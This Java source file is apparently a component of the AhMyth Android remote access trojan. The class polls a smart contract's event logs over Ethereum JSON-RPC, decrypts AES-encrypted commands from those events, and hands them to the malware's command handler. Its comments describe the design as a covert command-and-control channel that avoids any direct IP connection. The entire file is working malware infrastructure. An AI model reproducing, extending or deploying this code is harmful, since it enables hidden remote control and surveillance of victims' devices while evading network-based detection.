package ahmyth.mine.king.ahmyth;

import android.util.Log;
import org.json.JSONObject;
import org.json.JSONArray;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.atomic.AtomicLong;

/**
 * BlockchainEventPoller - Polls smart contract events for encrypted commands
 * 
 * Architecture:
 * - Polls contract event logs every X seconds
 * - Extracts Command(bytes encrypted) events
 * - Decrypts commands using shared AES key
 * - Processes commands via ConnectionManager
 * 
 * No direct IP connection - all communication via blockchain RPC
 */
public class BlockchainEventPoller {
    private static final String TAG = "BlockchainEventPoller";
    
    private String rpcUrl;
    private String contractAddress;
    private String aesKeyHex;
    private byte[] aesKey;
    private int pollingInterval; // seconds
    private boolean isRunning = false;
    private Thread pollingThread;
    private AtomicLong lastProcessedBlock = new AtomicLong(0);
    
    // Command event signature: Command(bytes)
    // Event signature hash: keccak256("Command(bytes)")
    // Calculated: keccak256("Command(bytes)") = 0x... (will be calculated at runtime or use known value)
    // For now, we'll filter by contract address only and parse all events
    // The actual topic will be: keccak256("Command(bytes)") which is the first topic in the event
    
    public BlockchainEventPoller(String rpcUrl, String contractAddress, String aesKeyHex, int pollingInterval) {
        this.rpcUrl = rpcUrl;
        this.contractAddress = contractAddress;
        this.aesKeyHex = aesKeyHex;
        this.pollingInterval = pollingInterval;
        
        // Convert hex key to bytes
        try {
            this.aesKey = hexStringToByteArray(aesKeyHex);
            if (this.aesKey.length != 32) {
                throw new IllegalArgumentException("AES key must be 32 bytes (64 hex characters)");
            }
        } catch (Exception e) {
            Log.e(TAG, "Invalid AES key", e);
            this.aesKey = null;
        }
    }
    
    /**
     * Start polling for blockchain events
     */
    public void start() {
        if (isRunning) {
            Log.w(TAG, "Polling already started");
            return;
        }
        
        if (aesKey == null) {
            Log.e(TAG, "Cannot start polling: invalid AES key");
            return;
        }
        
        isRunning = true;
        pollingThread = new Thread(new Runnable() {
            @Override
            public void run() {
                pollLoop();
            }
        });
        pollingThread.setDaemon(true);
        pollingThread.start();
        Log.d(TAG, "Blockchain event polling started");
    }
    
    /**
     * Stop polling
     */
    public void stop() {
        isRunning = false;
        if (pollingThread != null) {
            pollingThread.interrupt();
        }
        Log.d(TAG, "Blockchain event polling stopped");
    }
    
    /**
     * Main polling loop
     */
    private void pollLoop() {
        Log.d(TAG, "Polling loop started - RPC: " + rpcUrl + ", Contract: " + contractAddress);
        while (isRunning) {
            try {
                Log.d(TAG, "Polling blockchain for commands...");
                // Get latest block number
                long latestBlock = getLatestBlockNumber();
                if (latestBlock <= 0) {
                    Log.w(TAG, "Failed to get latest block, retrying...");
                    Thread.sleep(pollingInterval * 1000);
                    continue;
                }
                
                Log.d(TAG, "Latest block: " + latestBlock);
                
                // Get events from last processed block to latest with overlap/window
                long fromBlock = lastProcessedBlock.get();
                long windowStart = Math.max(1, latestBlock - 50); // keep a rolling window without replaying huge history
                if (fromBlock <= 0) {
                    fromBlock = windowStart;
                    Log.d(TAG, "Starting from block: " + fromBlock + " (windowed start)");
                } else {
                    // Re-scan a small overlap to avoid missing edge events
                    fromBlock = Math.max(windowStart, Math.max(1, fromBlock - 5));
                }
                
                Log.d(TAG, "Fetching events from block " + fromBlock + " to " + latestBlock);
                // Fetch events
                JSONArray events = getCommandEvents(fromBlock, latestBlock);
                
                if (events != null && events.length() > 0) {
                    Log.d(TAG, "Found " + events.length() + " command events");
                    
                    // Process each event
                    for (int i = 0; i < events.length(); i++) {
                        JSONObject event = events.getJSONObject(i);
                        processCommandEvent(event);
                    }
                } else {
                    Log.d(TAG, "No command events found in blocks " + fromBlock + "-" + latestBlock);
                }
                
                // Update last processed block (even if none found) while keeping overlap next loop
                lastProcessedBlock.set(latestBlock);
                
                // Wait before next poll
                Thread.sleep(pollingInterval * 1000);
                
            } catch (InterruptedException e) {
                Log.d(TAG, "Polling interrupted");
                break;
            } catch (Exception e) {
                Log.e(TAG, "Error in polling loop", e);
                try {
                    Thread.sleep(pollingInterval * 1000);
                } catch (InterruptedException ie) {
                    break;
                }
            }
        }
    }
    
    /**
     * Get latest block number from RPC
     */
    private long getLatestBlockNumber() {
        try {
            Log.d(TAG, "Requesting latest block number from RPC: " + rpcUrl);
            JSONObject request = new JSONObject();
            request.put("jsonrpc", "2.0");
            request.put("method", "eth_blockNumber");
            request.put("params", new JSONArray());
            request.put("id", 1);
            
            JSONObject response = sendRpcRequest(request);
            if (response != null && response.has("result")) {
                String hexBlock = response.getString("result");
                long blockNum = Long.parseLong(hexBlock.substring(2), 16);
                Log.d(TAG, "Latest block number: " + blockNum);
                return blockNum;
            } else if (response != null && response.has("error")) {
                Log.e(TAG, "RPC error: " + response.getJSONObject("error").toString());
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to get latest block", e);
        }
        return -1;
    }
    
    /**
     * Get Command events from contract
     */
    private JSONArray getCommandEvents(long fromBlock, long toBlock) {
        try {
            Log.d(TAG, "Fetching Command events from contract " + contractAddress);
            JSONObject request = new JSONObject();
            request.put("jsonrpc", "2.0");
            request.put("method", "eth_getLogs");
            request.put("id", 1);
            
            JSONObject params = new JSONObject();
            params.put("address", contractAddress);
            params.put("fromBlock", "0x" + Long.toHexString(fromBlock));
            params.put("toBlock", "0x" + Long.toHexString(toBlock));
            
            // Filter by event topic (Command(bytes))
            // keccak256("Command(bytes)") - we'll calculate or use known value
            // For Sepolia, if contract is deployed, we can get the actual topic
            // For now, get all events from contract and filter by data presence
            JSONArray topics = new JSONArray();
            // topics.put(COMMAND_EVENT_TOPIC); // Will be set when contract is deployed
            params.put("topics", topics);
            
            request.put("params", new JSONArray().put(params));
            
            JSONObject response = sendRpcRequest(request);
            if (response != null && response.has("result")) {
                JSONArray events = response.getJSONArray("result");
                Log.d(TAG, "Received " + events.length() + " events from blockchain");
                return events;
            } else if (response != null && response.has("error")) {
                Log.e(TAG, "RPC error getting events: " + response.getJSONObject("error").toString());
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to get events", e);
        }
        return null;
    }
    
    /**
     * Process a command event - decrypt and execute
     */
    private void processCommandEvent(JSONObject event) {
        try {
            // Extract encrypted data from event
            JSONArray topics = event.getJSONArray("topics");
            String data = event.getString("data");
            
            // Remove 0x prefix
            if (data.startsWith("0x")) {
                data = data.substring(2);
            }

            // Event data is ABI-encoded for dynamic bytes:
            // [0..32): offset, [32..64): length, [64..]: payload (padded)
            data = extractBytesFromEventData(data);
            
            // Decrypt command
            String decryptedCommand = BlockchainCrypto.decrypt(data, aesKey);
            if (decryptedCommand == null) {
                Log.e(TAG, "Failed to decrypt command");
                return;
            }
            
            Log.d(TAG, "Decrypted command: " + decryptedCommand);
            
            // Parse command JSON and process via ConnectionManager
            JSONObject command = new JSONObject(decryptedCommand);
            processCommand(command);
            
        } catch (Exception e) {
            Log.e(TAG, "Error processing command event", e);
        }
    }

    /**
     * Extract raw bytes payload from ABI-encoded event data (single bytes param).
     */
    private String extractBytesFromEventData(String dataHex) {
        try {
            if (dataHex == null || dataHex.length() < 128) {
                return dataHex;
            }
            // First 32 bytes = offset (usually 0x20)
            String offsetHex = dataHex.substring(0, 64);
            int offsetBytes = new java.math.BigInteger(offsetHex, 16).intValue();
            // Next 32 bytes = length
            String lengthHex = dataHex.substring(64, 128);
            int lengthBytes = new java.math.BigInteger(lengthHex, 16).intValue();
            // Actual payload starts after offset + length words
            int start = (offsetBytes * 2) + 64;
            int end = start + (lengthBytes * 2);
            if (start >= 0 && end <= dataHex.length()) {
                return dataHex.substring(start, end);
            }
        } catch (Exception e) {
            Log.w(TAG, "Failed to decode ABI-encoded event data, using raw hex", e);
        }
        return dataHex;
    }
    
    /**
     * Process decrypted command
     */
    private void processCommand(JSONObject command) {
        try {
            // Accept both "action" and legacy "order" keys
            String action = command.optString("action", "");
            if (action == null || action.isEmpty()) {
                action = command.optString("order", "");
            }
            JSONObject data = command.optJSONObject("data");
            if (data == null) {
                // Some payloads may nest under "payload"
                data = command.optJSONObject("payload");
            }
            
            // Route command to appropriate handler
            // This mimics the Socket.IO command handling in ConnectionManager
            if (ConnectionManager.context != null) {
                ConnectionManager.processBlockchainCommand(action, data);
            } else {
                Log.w(TAG, "ConnectionManager context not available");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error processing command", e);
        }
    }
    
    /**
     * Send JSON-RPC request with retry logic
     */
    private JSONObject sendRpcRequest(JSONObject request) {
        // Try multiple times with different timeout
        int maxRetries = 3;
        
        for (int attempt = 0; attempt < maxRetries; attempt++) {
            try {
                URL url = new URL(rpcUrl);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(15000); // Increased timeout
                conn.setReadTimeout(15000);
                conn.setInstanceFollowRedirects(true);
            
                // Send request
                try (OutputStream os = conn.getOutputStream()) {
                    byte[] input = request.toString().getBytes(StandardCharsets.UTF_8);
                    os.write(input, 0, input.length);
                }
                
                // Read response
                int responseCode = conn.getResponseCode();
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    try (BufferedReader br = new BufferedReader(
                            new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8))) {
                        StringBuilder response = new StringBuilder();
                        String responseLine;
                        while ((responseLine = br.readLine()) != null) {
                            response.append(responseLine.trim());
                        }
                        return new JSONObject(response.toString());
                    }
                } else {
                    Log.e(TAG, "RPC request failed with code: " + responseCode);
                }
            } catch (Exception e) {
                Log.e(TAG, "RPC request error (attempt " + (attempt + 1) + ")", e);
            }
            
            // Wait before retry
            if (attempt < maxRetries - 1) {
                try {
                    Thread.sleep(2000);
                } catch (InterruptedException ie) {
                    break;
                }
            }
        }
        return null;
    }
    
    /**
     * Convert hex string to byte array
     */
    private byte[] hexStringToByteArray(String hex) {
        if (hex == null || hex.isEmpty()) {
            return new byte[0];
        }
        if (hex.startsWith("0x")) {
            hex = hex.substring(2);
        }
        // Validate hex string has even length
        if (hex.length() % 2 != 0) {
            throw new IllegalArgumentException("Hex string must have even length, got: " + hex.length());
        }
        int len = hex.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(hex.charAt(i), 16) << 4)
                                 + Character.digit(hex.charAt(i+1), 16));
        }
        return data;
    }
}

